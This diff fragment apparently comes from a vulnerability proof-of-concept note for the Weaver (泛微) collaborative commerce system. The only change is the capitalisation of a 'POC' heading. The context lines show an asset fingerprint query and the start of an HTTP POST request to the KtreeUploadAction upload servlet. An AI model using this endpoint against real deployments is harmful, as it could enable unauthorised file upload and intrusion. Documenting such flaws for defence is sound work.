@@ -8,7 +8,7 @@
 app="泛微-协同商务系统"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image HTTP/1.1
